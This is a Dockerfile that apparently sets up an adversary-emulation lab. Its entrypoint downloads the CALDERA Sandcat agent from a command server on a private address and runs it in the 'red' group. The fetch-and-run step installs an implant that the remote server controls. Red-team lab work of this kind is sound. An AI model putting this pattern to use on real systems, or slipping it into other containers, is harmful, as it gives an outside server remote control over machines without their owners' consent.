FROM ubuntu:20.04

RUN apt-get update && apt-get install -y curl ca-certificates \
    && update-ca-certificates

ENV CALDERA_SERVER=http://172.18.0.10:8888

WORKDIR /opt

ENTRYPOINT sh -c "\
  echo '[+] Fetching Sandcat from $CALDERA_SERVER' && \
  curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' \"$CALDERA_SERVER/file/download\" -o sandcat && \
  chmod +x sandcat && \
  echo '[+] Launching Sandcat...' && \
  exec ./sandcat -server $CALDERA_SERVER -group red -v"
